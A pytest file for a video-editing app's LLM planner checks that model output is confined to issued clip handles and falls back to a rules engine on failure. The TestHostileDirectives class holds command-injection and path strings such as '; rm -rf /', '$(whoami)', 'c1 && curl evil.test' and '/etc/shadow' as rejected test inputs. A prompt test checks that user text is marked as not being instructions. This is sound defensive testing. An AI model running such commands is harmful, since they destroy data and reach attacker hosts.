"""The LLM planning path, tested with fake providers and no network.

The tests are grouped by the claim they defend, because most of them exist to
prove a security property rather than a feature:

- ``TestBrief``            the model is told handles, never ids or filenames
- ``TestDirectiveParsing`` what a model may say, and what is refused
- ``TestHostileDirectives`` what happens when it says something dangerous
- ``TestCompilation``      every number a model gives is clamped
- ``TestLlmPlanner``       end to end with a scripted provider
- ``TestFallback``         every failure mode reaches the rules engine
- ``TestModeResolution``   automatic mode's decision, made explicit
- ``TestStyles``           styles bind both planners
- ``TestProviderErrors``   HTTP status to retry policy

No test here makes a network call, and none needs a database.
"""

from __future__ import annotations

import json
from uuid import UUID, uuid4

import pytest

from visionforge.domain.directive import (
    CompileContext,
    DirectiveClip,
    DirectiveInvalidError,
    EditDirective,
    Pacing,
    compile_directive,
    extract_json_object,
    parse_directive,
)
from visionforge.domain.editbrief import (
    MAX_REQUEST_CHARS,
    build_brief,
    clean_request_text,
)
from visionforge.domain.editplan import (
    MAX_OUTPUT_MS,
    MAX_SEGMENT_MS,
    MIN_SEGMENT_MS,
    AspectRatio,
    AudioMode,
    FitMode,
    MediaFact,
    QualityPreset,
    validate_plan,
)
from visionforge.domain.ids import MediaId, ProjectId
from visionforge.domain.llm import (
    LlmRequest,
    LlmResponse,
    LlmUsage,
    ProviderPermanentError,
    ProviderTransientError,
    ProviderUnavailableError,
)
from visionforge.domain.llm_planner import (
    FallbackPlanner,
    FallbackReason,
    LlmPlanner,
    LlmPlanRejectedError,
    PlannerMode,
    resolve_mode,
)
from visionforge.domain.media import MediaKind
from visionforge.domain.planner import PlanRequest, RulesEnginePlanner
from visionforge.domain.prompts import PROMPT_VERSION, SYSTEM_PROMPT, build_user_prompt
from visionforge.domain.selection import Candidate, select
from visionforge.domain.style import EditStyle, profile_for
from visionforge.infra.llm.base import classify_status
from visionforge.infra.llm.stub_provider import StubProvider

PROJECT = ProjectId(UUID("11111111-1111-1111-1111-111111111111"))


def candidate(sequence: int, *, duration: int = 12_000, blur: float = 300.0) -> Candidate:
    """A usable clip. Values chosen to clear every usability gate."""
    return Candidate(
        media_id=MediaId(uuid4()),
        kind=MediaKind.VIDEO,
        is_ready=True,
        duration_ms=duration,
        width=1920,
        height=1080,
        blur_score=blur,
        contrast=55.0,
        mean_luminance=128.0,
        clipped_ratio=0.02,
        phash=f"{(sequence * 0x1111111111111111) & ((1 << 64) - 1):016x}",
        scene_count=3,
        has_faces=False,
        has_audio=True,
        sequence=sequence,
    )


def pool(count: int) -> list[Candidate]:
    # Descending sharpness, so c1 is always the strongest and handle order is
    # predictable in assertions.
    return [candidate(i, blur=500.0 - i * 20) for i in range(count)]


def brief_for(candidates: list[Candidate]):
    return build_brief(select(candidates, limit=len(candidates)))


def facts_for(candidates: list[Candidate]) -> dict[MediaId, MediaFact]:
    return {
        c.media_id: MediaFact(
            media_id=c.media_id,
            project_id=PROJECT,
            is_renderable=True,
            duration_ms=c.duration_ms,
            width=c.width,
            height=c.height,
        )
        for c in candidates
    }


def context_for(candidates: list[Candidate], *, style: EditStyle | None = None) -> CompileContext:
    b = brief_for(candidates)
    return CompileContext(
        project_id=PROJECT,
        aspect_ratio=AspectRatio.LANDSCAPE_16_9,
        width=1280,
        height=720,
        fps=30,
        fit=FitMode.COVER,
        audio=AudioMode.NONE,
        quality=QualityPreset.BALANCED,
        profile=profile_for(style),
        handles=b.handles,
        source_durations={c.media_id: c.duration_ms or 0 for c in candidates},
        target_duration_ms=20_000,
        max_clips=8,
        planner="llm",
        planner_version=PROMPT_VERSION,
    )


class ScriptedProvider:
    """Returns prepared responses in order. The test's stand-in for a model."""

    def __init__(self, *replies: str | Exception) -> None:
        self.replies = list(replies)
        self.calls: list[LlmRequest] = []

    @property
    def name(self) -> str:
        return "scripted"

    @property
    def model(self) -> str:
        return "scripted-1"

    def complete(self, request: LlmRequest) -> LlmResponse:
        self.calls.append(request)
        reply = self.replies.pop(0) if self.replies else "{}"
        if isinstance(reply, Exception):
            raise reply
        return LlmResponse(
            text=reply,
            provider=self.name,
            model=self.model,
            latency_ms=12.0,
            usage=LlmUsage(input_tokens=100, output_tokens=50),
            request_id="req_test",
        )


def directive_json(*refs: str, duration: int = 2_000, style: str = "fast_montage") -> str:
    return json.dumps(
        {
            "style": style,
            "pacing": "medium",
            "clips": [{"ref": ref, "duration_ms": duration} for ref in refs],
            "rationale": "Test directive.",
        }
    )


# --------------------------------------------------------------------- brief
class TestBrief:
    def test_clips_are_identified_by_handle_not_by_id(self) -> None:
        b = brief_for(pool(3))
        assert [clip.handle for clip in b.clips] == ["c1", "c2", "c3"]

    def test_the_payload_sent_to_a_model_contains_no_uuid(self) -> None:
        """The central claim: a model cannot name media it was not offered."""
        candidates = pool(4)
        payload = json.dumps(brief_for(candidates).as_payload())

        for c in candidates:
            assert str(c.media_id) not in payload

    def test_the_payload_contains_no_filename_or_path(self) -> None:
        payload = json.dumps(brief_for(pool(3)).as_payload())
        for token in ("/", "\\", ".mp4", "filename", "path", "key"):
            assert token not in payload

    def test_an_unusable_clip_is_never_offered_to_the_model(self) -> None:
        """Deterministic gates run first; the model never sees a black frame."""
        black = Candidate(
            media_id=MediaId(uuid4()),
            kind=MediaKind.VIDEO,
            is_ready=True,
            duration_ms=8_000,
            width=1920,
            height=1080,
            blur_score=0.0,
            contrast=0.4,
            mean_luminance=0.0,
            clipped_ratio=1.0,
            phash="ffffffffffffffff",
            sequence=9,
        )
        b = brief_for([*pool(2), black])

        assert str(black.media_id) not in json.dumps(b.as_payload())
        assert b.media_id_for("c3") is None
        assert b.rejected == 1

    def test_handles_resolve_back_to_the_right_media(self) -> None:
        candidates = pool(3)
        b = brief_for(candidates)
        assert b.media_id_for("c1") in {c.media_id for c in candidates}

    def test_an_unissued_handle_resolves_to_nothing(self) -> None:
        assert brief_for(pool(2)).media_id_for("c99") is None


class TestRequestText:
    def test_whitespace_is_collapsed(self) -> None:
        assert clean_request_text("  make   it\n\nfast ") == "make it fast"

    def test_empty_text_becomes_none(self) -> None:
        assert clean_request_text("   ") is None
        assert clean_request_text(None) is None

    def test_long_text_is_truncated(self) -> None:
        assert len(clean_request_text("x" * 5_000) or "") == MAX_REQUEST_CHARS


# --------------------------------------------------------------- parsing
class TestDirectiveParsing:
    def test_a_plain_object_parses(self) -> None:
        b = brief_for(pool(3))
        directive = parse_directive(directive_json("c1", "c2"), b)

        assert [c.ref for c in directive.clips] == ["c1", "c2"]
        assert directive.style is EditStyle.FAST_MONTAGE

    def test_json_inside_a_fenced_block_still_parses(self) -> None:
        b = brief_for(pool(2))
        wrapped = f"Sure! Here you go:\n```json\n{directive_json('c1')}\n```\nHope that helps."

        assert parse_directive(wrapped, b).clips[0].ref == "c1"

    def test_a_brace_inside_the_rationale_does_not_end_the_object(self) -> None:
        b = brief_for(pool(2))
        text = json.dumps(
            {"style": "custom", "clips": ["c1"], "rationale": "used {braces} deliberately"}
        )
        assert parse_directive(text, b).rationale == "used {braces} deliberately"

    def test_bare_string_handles_are_accepted(self) -> None:
        b = brief_for(pool(3))
        text = json.dumps({"style": "custom", "clips": ["c1", "c2"]})
        assert [c.ref for c in parse_directive(text, b).clips] == ["c1", "c2"]

    def test_an_unknown_key_is_ignored_rather_than_fatal(self) -> None:
        b = brief_for(pool(2))
        text = json.dumps({"style": "custom", "clips": ["c1"], "confidence": 0.9, "notes": "hi"})
        assert parse_directive(text, b).clips[0].ref == "c1"

    def test_a_repeated_handle_is_dropped_not_rejected(self) -> None:
        b = brief_for(pool(2))
        text = json.dumps({"style": "custom", "clips": ["c1", "c1", "c2"]})
        assert [c.ref for c in parse_directive(text, b).clips] == ["c1", "c2"]

    def test_prose_with_no_json_is_refused(self) -> None:
        b = brief_for(pool(2))
        with pytest.raises(DirectiveInvalidError) as caught:
            parse_directive("I'd be happy to help you edit this video!", b)
        assert caught.value.violations[0].code == "not_json"

    def test_an_empty_clip_list_is_refused(self) -> None:
        b = brief_for(pool(2))
        with pytest.raises(DirectiveInvalidError):
            parse_directive(json.dumps({"style": "custom", "clips": []}), b)

    def test_an_unknown_style_is_refused(self) -> None:
        b = brief_for(pool(2))
        text = json.dumps({"style": "vaporwave", "clips": ["c1"]})
        with pytest.raises(DirectiveInvalidError) as caught:
            parse_directive(text, b)
        assert caught.value.violations[0].code == "unknown_style"

    def test_a_boolean_duration_does_not_become_one_millisecond(self) -> None:
        """``bool`` is an ``int`` in Python; the parser must not be fooled."""
        b = brief_for(pool(2))
        text = json.dumps({"style": "custom", "clips": [{"ref": "c1", "duration_ms": True}]})
        assert parse_directive(text, b).clips[0].duration_ms is None

    def test_extract_returns_none_for_unbalanced_braces(self) -> None:
        assert extract_json_object('{"clips": [') is None


class TestHostileDirectives:
    """What a model says when it has been talked into saying something else."""

    def test_an_invented_handle_is_refused(self) -> None:
        b = brief_for(pool(2))
        with pytest.raises(DirectiveInvalidError) as caught:
            parse_directive(directive_json("c1", "c99"), b)
        assert caught.value.violations[0].code == "unknown_ref"

    def test_a_uuid_as_a_handle_is_refused(self) -> None:
        """Even the *correct* id of a real clip is not a valid reference."""
        candidates = pool(2)
        b = brief_for(candidates)
        text = json.dumps({"style": "custom", "clips": [str(candidates[0].media_id)]})

        with pytest.raises(DirectiveInvalidError) as caught:
            parse_directive(text, b)
        assert caught.value.violations[0].code == "unknown_ref"

    def test_a_filesystem_path_as_a_handle_is_refused(self) -> None:
        b = brief_for(pool(2))
        for hostile in ("/etc/passwd", "C:\\Windows\\System32\\cmd.exe", "../../../secret.mp4"):
            with pytest.raises(DirectiveInvalidError):
                parse_directive(json.dumps({"style": "custom", "clips": [hostile]}), b)

    def test_an_ffmpeg_argument_as_a_handle_is_refused(self) -> None:
        b = brief_for(pool(2))
        for hostile in ("-i /dev/zero", "; rm -rf /", "$(whoami)", "c1 && curl evil.test"):
            with pytest.raises(DirectiveInvalidError):
                parse_directive(json.dumps({"style": "custom", "clips": [hostile]}), b)

    def test_extra_fields_naming_paths_never_reach_the_plan(self) -> None:
        """A model volunteering an output path is simply not listened to."""
        candidates = pool(2)
        b = brief_for(candidates)
        text = json.dumps(
            {
                "style": "custom",
                "clips": ["c1"],
                "output_path": "/tmp/pwned.mp4",
                "ffmpeg_args": ["-i", "/etc/shadow"],
                "command": "rm -rf /",
            }
        )
        directive = parse_directive(text, b)
        plan = compile_directive(directive, context_for(candidates))
        payload = json.dumps(plan.as_payload())

        assert "pwned" not in payload
        assert "ffmpeg_args" not in payload
        assert "rm -rf" not in payload
        assert "/etc/shadow" not in payload

    def test_a_rationale_carrying_a_command_is_stored_but_never_structural(self) -> None:
        """Free text is display-only: it lands in one field and changes nothing."""
        candidates = pool(2)
        b = brief_for(candidates)
        text = json.dumps({"style": "custom", "clips": ["c1"], "rationale": "; rm -rf / #"})
        plan = compile_directive(parse_directive(text, b), context_for(candidates))

        assert plan.metadata["rationale"] == "; rm -rf / #"
        assert all(
            isinstance(value, int)
            for value in (
                plan.output.width,
                plan.output.height,
                plan.output.fps,
            )
        )
        assert validate_plan(plan, facts_for(candidates)) == []


# ----------------------------------------------------------------- compiling
class TestCompilation:
    def test_handles_become_the_right_media_ids(self) -> None:
        candidates = pool(3)
        b = brief_for(candidates)
        directive = parse_directive(directive_json("c2", "c1"), b)
        plan = compile_directive(directive, context_for(candidates))

        assert plan.segments[0].media_id == b.media_id_for("c2")
        assert plan.segments[1].media_id == b.media_id_for("c1")

    def test_an_absurdly_long_duration_is_clamped(self) -> None:
        candidates = pool(2)
        directive = EditDirective(
            clips=(DirectiveClip("c1", duration_ms=9_999_999),),
            style=EditStyle.CUSTOM,
        )
        plan = compile_directive(directive, context_for(candidates))

        assert plan.segments[0].duration_ms <= MAX_SEGMENT_MS

    def test_a_duration_longer_than_the_source_is_capped_to_the_source(self) -> None:
        candidates = [candidate(0, duration=4_000)]
        directive = EditDirective(
            clips=(DirectiveClip("c1", duration_ms=30_000),), style=EditStyle.CUSTOM
        )
        plan = compile_directive(directive, context_for(candidates))

        assert plan.segments[0].source_out_ms <= 4_000

    def test_a_negative_duration_is_clamped_to_the_minimum(self) -> None:
        candidates = pool(4)
        directive = EditDirective(
            clips=tuple(DirectiveClip(f"c{i + 1}", duration_ms=-5_000) for i in range(4)),
            style=EditStyle.CUSTOM,
        )
        plan = compile_directive(directive, context_for(candidates))

        assert plan.segments
        for segment in plan.segments:
            assert segment.duration_ms >= MIN_SEGMENT_MS

    def test_a_plan_that_clamps_below_the_output_minimum_compiles_to_nothing(self) -> None:
        """The compiler stays total: too-short means empty, never invalid.

        One clip clamped to the 300 ms floor cannot make a legal plan, because
        the output minimum is 1 000 ms. Rather than emit something the validator
        would reject, the compiler returns no segments -- and the planner reads
        that as "the model produced nothing usable" and falls back.
        """
        candidates = pool(1)
        directive = EditDirective(
            clips=(DirectiveClip("c1", duration_ms=-5_000),), style=EditStyle.CUSTOM
        )
        plan = compile_directive(directive, context_for(candidates))

        assert plan.segments == ()

    def test_a_directive_that_compiles_to_nothing_falls_back(self) -> None:
        """The end of that path, asserted rather than assumed."""
        text = json.dumps({"style": "custom", "clips": [{"ref": "c1", "duration_ms": -5_000}]})
        planner = FallbackPlanner(LlmPlanner(ScriptedProvider(text, text)), RulesEnginePlanner())
        outcome = planner.plan(PlanRequest(project_id=PROJECT, min_clips=2), pool(4))

        assert outcome.plan.planner == "rules-engine"
        assert planner.last_run.fallback_reason is FallbackReason.INVALID_PLAN

    def test_the_total_never_exceeds_the_output_maximum(self) -> None:
        candidates = [candidate(i, duration=MAX_SEGMENT_MS) for i in range(40)]
        directive = EditDirective(
            clips=tuple(DirectiveClip(f"c{i + 1}", duration_ms=MAX_SEGMENT_MS) for i in range(40)),
            style=EditStyle.CUSTOM,
        )
        context = context_for(candidates)
        context = CompileContext(**{**_as_dict(context), "max_clips": 40})
        plan = compile_directive(directive, context)

        assert plan.total_duration_ms <= MAX_OUTPUT_MS

    def test_segment_orders_are_contiguous_from_zero(self) -> None:
        candidates = pool(4)
        directive = parse_directive(directive_json("c1", "c2", "c3"), brief_for(candidates))
        plan = compile_directive(directive, context_for(candidates))

        assert [s.order for s in plan.ordered_segments] == [0, 1, 2]

    def test_a_compiled_plan_passes_the_phase_4_validator(self) -> None:
        candidates = pool(4)
        directive = parse_directive(directive_json("c1", "c2", "c3"), brief_for(candidates))
        plan = compile_directive(directive, context_for(candidates))

        assert validate_plan(plan, facts_for(candidates)) == []

    def test_geometry_comes_from_the_context_not_the_model(self) -> None:
        candidates = pool(2)
        plan = compile_directive(
            parse_directive(directive_json("c1"), brief_for(candidates)),
            context_for(candidates),
        )
        assert (plan.output.width, plan.output.height, plan.output.fps) == (1280, 720, 30)

    def test_pacing_maps_into_the_style_bounds(self) -> None:
        candidates = pool(2)
        profile = profile_for(EditStyle.CINEMATIC)

        for pacing, expected in (
            (Pacing.FAST, profile.min_clip_ms),
            (Pacing.SLOW, profile.max_clip_ms),
            (Pacing.MEDIUM, profile.target_clip_ms),
        ):
            directive = EditDirective(
                clips=(DirectiveClip("c1"),), style=EditStyle.CINEMATIC, pacing=pacing
            )
            plan = compile_directive(directive, context_for(candidates, style=EditStyle.CINEMATIC))
            assert plan.segments[0].duration_ms == expected


def _as_dict(context: CompileContext) -> dict[str, object]:
    return {field: getattr(context, field) for field in CompileContext.__slots__}


# ------------------------------------------------------------------- planner
class TestLlmPlanner:
    def test_plans_from_a_scripted_response(self) -> None:
        candidates = pool(4)
        planner = LlmPlanner(ScriptedProvider(directive_json("c1", "c2", "c3")))
        outcome = planner.plan(PlanRequest(project_id=PROJECT, min_clips=2), candidates)

        assert len(outcome.plan.segments) == 3
        assert outcome.plan.planner == "llm"

    def test_the_plan_records_its_provenance(self) -> None:
        planner = LlmPlanner(ScriptedProvider(directive_json("c1", "c2")))
        outcome = planner.plan(PlanRequest(project_id=PROJECT), pool(3))

        assert outcome.plan.metadata["provider"] == "scripted"
        assert outcome.plan.metadata["model"] == "scripted-1"
        assert outcome.plan.metadata["prompt_version"] == PROMPT_VERSION

    def test_token_usage_is_recorded(self) -> None:
        planner = LlmPlanner(ScriptedProvider(directive_json("c1", "c2")))
        planner.plan(PlanRequest(project_id=PROJECT), pool(3))

        assert planner.last_run.input_tokens == 100
        assert planner.last_run.output_tokens == 50
        assert planner.last_run.request_id == "req_test"

    def test_the_request_text_is_digested_never_stored(self) -> None:
        planner = LlmPlanner(ScriptedProvider(directive_json("c1", "c2")))
        planner.plan(
            PlanRequest(project_id=PROJECT, request_text="my secret holiday in Da Nang"),
            pool(3),
        )
        run = planner.last_run

        assert run.request_digest and len(run.request_digest) == 16
        assert "Nang" not in json.dumps(run.as_payload())
        assert run.request_chars == len("my secret holiday in Da Nang")

    def test_one_repair_attempt_follows_an_invalid_response(self) -> None:
        provider = ScriptedProvider("not json at all", directive_json("c1", "c2"))
        planner = LlmPlanner(provider)
        outcome = planner.plan(PlanRequest(project_id=PROJECT), pool(3))

        assert len(provider.calls) == 2
        assert len(outcome.plan.segments) == 2

    def test_the_repair_prompt_names_the_specific_problem(self) -> None:
        provider = ScriptedProvider(directive_json("c1", "c99"), directive_json("c1"))
        LlmPlanner(provider).plan(PlanRequest(project_id=PROJECT, min_clips=1), pool(3))

        assert "c99" in provider.calls[1].user

    def test_two_invalid_responses_are_rejected(self) -> None:
        planner = LlmPlanner(ScriptedProvider("nope", "still nope"))
        with pytest.raises(LlmPlanRejectedError) as caught:
            planner.plan(PlanRequest(project_id=PROJECT), pool(3))

        assert caught.value.reason is FallbackReason.INVALID_OUTPUT

    def test_a_transient_provider_error_is_retried_once(self) -> None:
        provider = ScriptedProvider(ProviderTransientError("429"), directive_json("c1", "c2"))
        outcome = LlmPlanner(provider).plan(PlanRequest(project_id=PROJECT), pool(3))

        assert len(provider.calls) == 2
        assert len(outcome.plan.segments) == 2

    def test_a_permanent_provider_error_is_not_retried(self) -> None:
        provider = ScriptedProvider(ProviderPermanentError("401 bad key"))
        with pytest.raises(LlmPlanRejectedError) as caught:
            LlmPlanner(provider).plan(PlanRequest(project_id=PROJECT), pool(3))

        assert len(provider.calls) == 1
        assert caught.value.reason is FallbackReason.PROVIDER_ERROR

    def test_repeated_transient_errors_give_up(self) -> None:
        provider = ScriptedProvider(ProviderTransientError("503"), ProviderTransientError("503"))
        with pytest.raises(LlmPlanRejectedError) as caught:
            LlmPlanner(provider).plan(PlanRequest(project_id=PROJECT), pool(3))

        assert caught.value.reason is FallbackReason.PROVIDER_ERROR

    def test_an_unavailable_provider_is_reported_as_such(self) -> None:
        provider = ScriptedProvider(ProviderUnavailableError("no provider"))
        with pytest.raises(LlmPlanRejectedError) as caught:
            LlmPlanner(provider).plan(PlanRequest(project_id=PROJECT), pool(3))

        assert caught.value.reason is FallbackReason.PROVIDER_UNAVAILABLE

    def test_too_little_usable_media_is_refused_before_any_call(self) -> None:
        provider = ScriptedProvider(directive_json("c1"))
        with pytest.raises(LlmPlanRejectedError) as caught:
            LlmPlanner(provider).plan(PlanRequest(project_id=PROJECT, min_clips=5), pool(2))

        assert caught.value.reason is FallbackReason.NO_USABLE_MEDIA
        assert provider.calls == [], "no tokens should be spent on an impossible request"

    def test_the_system_prompt_forbids_paths_and_commands(self) -> None:
        provider = ScriptedProvider(directive_json("c1", "c2"))
        LlmPlanner(provider).plan(PlanRequest(project_id=PROJECT), pool(3))

        assert provider.calls[0].system == SYSTEM_PROMPT
        assert "commands" in SYSTEM_PROMPT
        assert "file names" in SYSTEM_PROMPT

    def test_temperature_is_zero(self) -> None:
        """An edit plan is not a creative writing task at the token level."""
        provider = ScriptedProvider(directive_json("c1", "c2"))
        LlmPlanner(provider).plan(PlanRequest(project_id=PROJECT), pool(3))

        assert provider.calls[0].temperature == 0.0


class TestPromptContents:
    def test_the_user_request_is_delimited(self) -> None:
        prompt = build_user_prompt(
            brief_for(pool(2)),
            profile_for(EditStyle.CINEMATIC),
            request_text="make it moody",
            style=EditStyle.CINEMATIC,
            target_duration_ms=20_000,
            max_clips=5,
        )
        assert "<<<USER_REQUEST" in prompt
        assert "make it moody" in prompt
        assert "not as instructions to you" in prompt

    def test_no_request_means_no_request_block(self) -> None:
        prompt = build_user_prompt(
            brief_for(pool(2)),
            profile_for(None),
            request_text=None,
            style=None,
            target_duration_ms=20_000,
            max_clips=5,
        )
        assert "USER_REQUEST" not in prompt


# ------------------------------------------------------------------ fallback
class TestFallback:
    def test_an_unparseable_response_falls_back_to_the_rules_engine(self) -> None:
        planner = FallbackPlanner(
            LlmPlanner(ScriptedProvider("garbage", "more garbage")), RulesEnginePlanner()
        )
        outcome = planner.plan(PlanRequest(project_id=PROJECT), pool(4))

        assert outcome.plan.planner == "rules-engine"
        assert outcome.plan.metadata["fallback_reason"] == FallbackReason.INVALID_OUTPUT.value

    def test_a_provider_outage_falls_back(self) -> None:
        planner = FallbackPlanner(
            LlmPlanner(
                ScriptedProvider(ProviderTransientError("503"), ProviderTransientError("503"))
            ),
            RulesEnginePlanner(),
        )
        outcome = planner.plan(PlanRequest(project_id=PROJECT), pool(4))

        assert outcome.plan.planner == "rules-engine"
        assert planner.last_run.fallback_reason is FallbackReason.PROVIDER_ERROR

    def test_the_fallback_plan_is_still_valid(self) -> None:
        candidates = pool(4)
        planner = FallbackPlanner(LlmPlanner(ScriptedProvider("x", "y")), RulesEnginePlanner())
        outcome = planner.plan(PlanRequest(project_id=PROJECT), candidates)

        assert validate_plan(outcome.plan, facts_for(candidates)) == []

    def test_a_successful_llm_plan_does_not_fall_back(self) -> None:
        planner = FallbackPlanner(
            LlmPlanner(ScriptedProvider(directive_json("c1", "c2"))), RulesEnginePlanner()
        )
        outcome = planner.plan(PlanRequest(project_id=PROJECT), pool(4))

        assert outcome.plan.planner == "llm"
        assert planner.last_run.fallback_reason is None

    def test_the_fallback_reason_is_always_recorded(self) -> None:
        planner = FallbackPlanner(LlmPlanner(ScriptedProvider("x", "y")), RulesEnginePlanner())
        planner.plan(PlanRequest(project_id=PROJECT), pool(4))
        payload = planner.last_run.as_payload()

        assert payload["status"] == "fallback"
        assert payload["fallback_reason"]
        assert payload["fallback_detail"]

    def test_an_unexpected_planner_bug_still_falls_back(self) -> None:
        """A crash in the LLM path must not become a failed request."""

        class Exploding:
            name = "boom"
            model = "boom-1"

            def complete(self, request: LlmRequest) -> LlmResponse:
                raise RuntimeError("kaboom")

        planner = FallbackPlanner(LlmPlanner(Exploding()), RulesEnginePlanner())
        outcome = planner.plan(PlanRequest(project_id=PROJECT), pool(4))

        assert outcome.plan.planner == "rules-engine"
        assert planner.last_run.fallback_reason is FallbackReason.UNEXPECTED_ERROR

    def test_the_fallback_keeps_the_requested_style(self) -> None:
        """The user loses the interpretation, not the style they chose."""
        planner = FallbackPlanner(LlmPlanner(ScriptedProvider("x", "y")), RulesEnginePlanner())
        outcome = planner.plan(
            PlanRequest(project_id=PROJECT, style=EditStyle.CINEMATIC, target_duration_ms=40_000),
            pool(6),
        )
        profile = profile_for(EditStyle.CINEMATIC)

        assert outcome.plan.metadata["style"] == EditStyle.CINEMATIC.value
        for segment in outcome.plan.segments:
            assert profile.min_clip_ms <= segment.duration_ms <= profile.max_clip_ms


# -------------------------------------------------------------------- modes
class TestModeResolution:
    def test_rules_mode_is_honoured_even_when_ai_is_available(self) -> None:
        decision = resolve_mode(
            PlannerMode.RULES, provider_available=True, request_text="cinematic please"
        )
        assert decision.mode is PlannerMode.RULES

    def test_ai_mode_without_a_provider_degrades_to_rules(self) -> None:
        decision = resolve_mode(
            PlannerMode.AI, provider_available=False, request_text="cinematic please"
        )
        assert decision.mode is PlannerMode.RULES
        assert "no provider" in decision.reason

    def test_ai_mode_with_a_provider_uses_ai(self) -> None:
        decision = resolve_mode(PlannerMode.AI, provider_available=True, request_text=None)
        assert decision.mode is PlannerMode.AI

    def test_automatic_uses_ai_when_the_user_wrote_something(self) -> None:
        decision = resolve_mode(
            PlannerMode.AUTOMATIC,
            provider_available=True,
            request_text="make a fast football highlight",
        )
        assert decision.mode is PlannerMode.AI

    def test_automatic_uses_rules_for_a_bare_style(self) -> None:
        """A style is already a complete, deterministic instruction."""
        decision = resolve_mode(
            PlannerMode.AUTOMATIC,
            provider_available=True,
            request_text=None,
            style=EditStyle.CINEMATIC,
        )
        assert decision.mode is PlannerMode.RULES

    def test_automatic_uses_rules_when_nothing_was_stated(self) -> None:
        decision = resolve_mode(PlannerMode.AUTOMATIC, provider_available=True, request_text=None)
        assert decision.mode is PlannerMode.RULES

    def test_automatic_matches_a_style_by_keyword_when_ai_is_off(self) -> None:
        decision = resolve_mode(
            PlannerMode.AUTOMATIC,
            provider_available=False,
            request_text="make an energetic gaming montage",
        )
        assert decision.mode is PlannerMode.RULES
        assert decision.inferred_style is EditStyle.GAMING
        assert "keyword" in decision.reason

    def test_every_decision_carries_a_reason(self) -> None:
        for mode in PlannerMode:
            for available in (True, False):
                decision = resolve_mode(
                    mode, provider_available=available, request_text="cinematic travel"
                )
                assert decision.reason


# ------------------------------------------------------------------- styles
class TestStyles:
    @pytest.mark.parametrize("style", list(EditStyle))
    def test_the_rules_engine_honours_every_style(self, style: EditStyle) -> None:
        candidates = pool(6)
        outcome = RulesEnginePlanner().plan(
            PlanRequest(project_id=PROJECT, style=style, target_duration_ms=30_000), candidates
        )
        profile = profile_for(style)

        assert validate_plan(outcome.plan, facts_for(candidates)) == []
        for segment in outcome.plan.segments:
            assert profile.min_clip_ms <= segment.duration_ms <= profile.max_clip_ms

    def test_no_style_reproduces_phase_4_behaviour(self) -> None:
        """The regression guard: an unstyled plan is unchanged by Phase 5."""
        candidates = pool(5)
        request = PlanRequest(project_id=PROJECT, target_duration_ms=25_000, max_clips=5)
        outcome = RulesEnginePlanner().plan(request, candidates)

        assert outcome.plan.total_duration_ms == 25_000
        assert outcome.plan.metadata["per_clip_ms"] == 5_000
        assert outcome.plan.output.quality is QualityPreset.BALANCED

    def test_fast_montage_cuts_faster_than_cinematic(self) -> None:
        candidates = pool(8)
        fast = RulesEnginePlanner().plan(
            PlanRequest(project_id=PROJECT, style=EditStyle.FAST_MONTAGE), candidates
        )
        slow = RulesEnginePlanner().plan(
            PlanRequest(project_id=PROJECT, style=EditStyle.CINEMATIC), candidates
        )

        assert fast.plan.segments[0].duration_ms < slow.plan.segments[0].duration_ms

    def test_every_style_profile_has_coherent_bounds(self) -> None:
        for style in EditStyle:
            profile = profile_for(style)
            assert profile.min_clip_ms <= profile.target_clip_ms <= profile.max_clip_ms
            assert profile.min_clip_ms >= MIN_SEGMENT_MS
            assert profile.max_clip_ms <= MAX_SEGMENT_MS


# ----------------------------------------------------------------- providers
class TestProviderErrorClassification:
    @pytest.mark.parametrize("status", [429, 500, 502, 503, 408])
    def test_busy_and_broken_are_transient(self, status: int) -> None:
        assert isinstance(classify_status(status, "busy"), ProviderTransientError)

    @pytest.mark.parametrize("status", [400, 401, 403, 404, 422])
    def test_refusals_are_permanent(self, status: int) -> None:
        assert isinstance(classify_status(status, "bad key"), ProviderPermanentError)

    def test_the_error_body_is_truncated(self) -> None:
        error = classify_status(400, "x" * 5_000)
        assert len(str(error)) < 400


class TestStubProvider:
    def test_it_answers_a_real_prompt_with_a_valid_directive(self) -> None:
        candidates = pool(4)
        b = brief_for(candidates)
        prompt = build_user_prompt(
            b,
            profile_for(EditStyle.FAST_MONTAGE),
            request_text=None,
            style=EditStyle.FAST_MONTAGE,
            target_duration_ms=10_000,
            max_clips=4,
        )
        response = StubProvider().complete(LlmRequest(system=SYSTEM_PROMPT, user=prompt))

        directive = parse_directive(response.text, b)
        assert directive.clips
        assert (
            validate_plan(
                compile_directive(directive, context_for(candidates)), facts_for(candidates)
            )
            == []
        )

    def test_it_reports_no_token_usage(self) -> None:
        """No tokens were spent, so none are claimed."""
        response = StubProvider().complete(LlmRequest(system="s", user='{"clips":[]}'))
        assert response.usage.total_tokens is None

    def test_it_identifies_itself_as_a_stub(self) -> None:
        provider = StubProvider()
        assert provider.name == "stub"
        assert "stub" in provider.model
